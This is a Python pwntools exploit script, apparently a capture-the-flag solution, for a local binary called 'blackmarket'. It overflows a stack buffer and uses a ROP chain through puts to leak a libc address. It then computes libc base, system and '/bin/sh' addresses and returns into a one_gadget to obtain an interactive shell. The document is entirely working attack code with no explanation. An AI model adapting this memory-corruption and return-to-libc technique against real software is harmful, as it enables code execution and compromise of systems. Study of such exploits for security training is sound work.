from pwn import *

def exploit():
    #p = remote("127.0.0.1", 8888)
    p = process("./blackmarket")
    binary = ELF("./blackmarket")
    libc = ELF("libc6_2.27-3ubuntu1_amd64.so")
    padding = 184
    poprdi = 0x0000000000401f23
    plt_puts = binary.symbols["plt.puts"]
    got_puts = binary.symbols["got.puts"]
    main = binary.symbols["main"]

    for i in range(5):
        p.sendline("9")

    payload = "A" * padding
    payload += p64(poprdi) + p64(got_puts) + p64(plt_puts) + p64(main)
    p.sendline(payload)
    
    p.recvuntil("Thanks! we will proceed your request :)\n")
    libc_leak = u64(p.recvline()[:-1].ljust(8, "\x00"))
    log.info("Libc leak: {}".format(hex(libc_leak)))
    libc_base = libc_leak - libc.symbols["puts"]
    log.info("Libc base: {}".format(hex(libc_base)))
    system_libc = libc_base + libc.symbols["system"]
    log.info("System Libc leak: {}".format(hex(system_libc)))
    str_bin_sh = libc_base + libc.search("/bin/sh").next()
    log.info("/bin/sh libc leak: {}".format(hex(str_bin_sh)))
    one_gadget = libc_base + 0x4f2c5
    log.info("One gadget address: {}".format(hex(one_gadget)))
    
    for i in range(5):
        p.sendline("9")
    payload = "A" * padding
    payload += p64(one_gadget)
    # payload += p64(poprdi)
    # payload += p64(str_bin_sh)
    # payload += p64(0x0000000000401f21)
    # payload += p64(0)*2
    # payload += p64(system_libc)

    gdb.attach(p, '''
               b *main
               ''')

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    exploit()
